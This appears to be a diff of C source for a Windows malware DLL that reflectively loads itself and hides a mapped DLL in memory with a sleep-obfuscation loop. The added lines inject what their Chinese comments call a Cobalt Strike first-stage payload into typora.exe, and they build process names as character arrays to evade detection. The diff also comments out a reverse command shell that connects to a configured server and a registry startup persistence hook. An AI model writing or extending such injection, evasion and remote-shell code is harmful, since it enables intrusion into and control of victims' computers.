@@ -560,7 +560,6 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 }
 
-
 EXTERN_DLL_EXPORT bool yolo()
 {
 	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
@@ -649,7 +648,9 @@ static status_t custom_process_attach(HMODULE hModule)
 	PSAC_DLL_HEADER sac_dll_header = NULL;
 
 	// even if unmapped it's in the PEB
-	PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
+	WCHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l', L'\0' };
+	PBYTE sac_dll_base = (PBYTE)GetModuleHandleW(sac_dll_path);
+
 	if (sac_dll_base == NULL)
 		return ST_ERROR;
 
@@ -670,6 +671,8 @@ static status_t custom_process_attach(HMODULE hModule)
 		return ST_ERROR;
 	}
 
+
+
 	// initialize functions 
 	nt_functions_t nt_funcs = { 0 };
 	if (!load_nt_functions(&nt_funcs))
@@ -683,51 +686,64 @@ static status_t custom_process_attach(HMODULE hModule)
 	sleaping_para.view_size = sac_dll_size;
 	sleaping_para.nt = &nt_funcs;
 
+	// 修改注册表添加启动项
+	//if (add_to_startup() != ST_SUCCESS)
+	//	return FALSE;
+
+	// 向其他进程注入CS的一阶段载荷
+	// 拓展：可以让该DLL持久存在与进程中，并尝试向其他进程中注入各种恶意代码
+    WCHAR str_notepad[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
+    WCHAR str_typora[] = { 't', 'y', 'p', 'o', 'r', 'a', '.', 'e', 'x', 'e', L'\0' };
+	WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
+	inject(&nt_funcs, str_typora);
+
+
+
 	do
 	{
-		MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
+		//MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
 		status = sleaping(&sleaping_para);
 		if (ST_FAILED(status))
 		{
-			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+			//MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
 			break;
 		}
 	} while (true);
 
 
 
-	global_functions_t global_functions = { 0 };
-
-	if (!load_winsock_functions(&global_functions.ws2))
-	{
-		return ST_ERROR;
-	}
-	
-	if (!load_gdi32_functions(&global_functions.gdi32))
-	{
-		return ST_ERROR;
-	}
-
-
-	if (startup_wsa(&global_functions.ws2) != 0)
-	{
-		return ST_ERROR;
-	}
-
-	SOCKET socket = INVALID_SOCKET;
-
-	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, &global_functions.ws2);
-	if (socket == INVALID_SOCKET)
-	{
-		cleanup_wsa(&global_functions.ws2);
-		return ST_SOCKET_ERROR;
-	}
-
-	status = win_cmd(socket);
-	
-
-__cleanup_0:
-	cleanup_wsa(&global_functions.ws2);
+//	global_functions_t global_functions = { 0 };
+//
+//	if (!load_winsock_functions(&global_functions.ws2))
+//	{
+//		return ST_ERROR;
+//	}
+//	
+//	if (!load_gdi32_functions(&global_functions.gdi32))
+//	{
+//		return ST_ERROR;
+//	}
+//
+//
+//	if (startup_wsa(&global_functions.ws2) != 0)
+//	{
+//		return ST_ERROR;
+//	}
+//
+//	SOCKET socket = INVALID_SOCKET;
+//
+//	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, &global_functions.ws2);
+//	if (socket == INVALID_SOCKET)
+//	{
+//		cleanup_wsa(&global_functions.ws2);
+//		return ST_SOCKET_ERROR;
+//	}
+//
+//	status = win_cmd(socket);
+//	
+//
+//__cleanup_0:
+//	cleanup_wsa(&global_functions.ws2);
 
 	return status;
 }
